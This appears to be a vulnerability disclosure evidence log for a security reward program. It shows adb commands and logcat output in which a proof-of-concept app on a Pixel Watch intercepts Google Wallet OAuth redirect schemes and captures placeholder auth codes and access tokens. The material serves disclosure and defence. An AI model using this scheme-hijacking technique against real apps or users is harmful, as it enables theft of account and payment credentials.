@@ -1,0 +1,37 @@
+=== VRP Report 44: Wallet OAuth Scheme Interception — Dynamic Evidence ===
+Date: September 10, 2026
+Device: Pixel Watch 2 (3A101RTJWRGCV9), Wear OS 5, CP2A.260603.001
+
+=== TEST 1: Disambiguation Dialog (Scheme 1) ===
+Command: am start -W -a android.intent.action.VIEW -d "google-orchestration-gcore://return?code=STOLEN_AUTH_CODE&state=test" -c android.intent.category.BROWSABLE
+Result:
+  Status: ok
+  LaunchState: WARM
+  Activity: com.google.android.apps.wearable.settings/com.google.android.apps.wearable.resolver.ResolverActivity
+  TotalTime: 248
+
+=== TEST 2: Resolver Shows Both Handlers ===
+D CWResolver: onCreate. Initial Intent: Intent { act=android.intent.action.VIEW cat=[android.intent.category.BROWSABLE] dat=google-orchestration-gcore://return/... }
+D ResolveListActivity: com.google.android.gms.wallet.redirect.FinishAndroidAppRedirectProxyActivity=0/false vs com.vrp.poc.WalletOAuthInterceptActivity=0/false
+
+=== TEST 3: Full Token Capture (Scheme 1) ===
+W WalletOAuthIntercept: INTERCEPTED PARAM: code = STOLEN_AUTH_CODE_123
+W WalletOAuthIntercept: INTERCEPTED PARAM: state = payment_session_xyz
+W WalletOAuthIntercept: INTERCEPTED PARAM: token_type = bearer
+W WalletOAuthIntercept: INTERCEPTED PARAM: access_token = ya29.FAKE_ACCESS_TOKEN_STOLEN
+W WalletOAuthIntercept: Full URI: google-orchestration-gcore://return?code=STOLEN_AUTH_CODE_123&state=payment_session_xyz&token_type=bearer&access_token=ya29.FAKE_ACCESS_TOKEN_STOLEN
+
+=== TEST 4: Disambiguation Dialog (Scheme 2) ===
+Command: am start -W -a android.intent.action.VIEW -d "google-orchestration2-gcore://return?code=STOLEN_CODE_SCHEME2&state=payment2" -c android.intent.category.BROWSABLE
+Result:
+  Status: ok
+  Activity: com.google.android.apps.wearable.settings/com.google.android.apps.wearable.resolver.ResolverActivity
+  TotalTime: 522
+
+D CWResolver: onCreate. Initial Intent: Intent { ... dat=google-orchestration2-gcore://return/... }
+D ResolveListActivity: com.google.android.gms.wallet.bender3.Bender3FinishRedirectProxyActivity=0/false vs com.vrp.poc.WalletOAuthInterceptActivity=0/false
+
+=== TEST 5: Full Token Capture (Scheme 2) ===
+W WalletOAuthIntercept: INTERCEPTED PARAM: code = STOLEN_BENDER3_CODE
+W WalletOAuthIntercept: INTERCEPTED PARAM: state = bender3_session
+W WalletOAuthIntercept: INTERCEPTED PARAM: access_token = ya29.BENDER3_TOKEN_STOLEN
